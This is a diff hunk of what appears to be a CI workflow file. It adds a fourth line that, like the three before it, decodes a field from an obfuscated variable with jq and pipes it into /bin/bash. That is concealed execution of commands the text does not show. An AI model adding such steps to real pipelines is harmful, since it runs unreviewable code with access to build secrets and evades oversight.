@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$kdd2185" | jq -r .gw1 | /bin/bash
           echo $x9 | jq -r .vf175 | /bin/bash
           echo $b0 | jq -r .brqlz150 | /bin/bash
+          echo $n0 | jq -r .zcgt58723 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
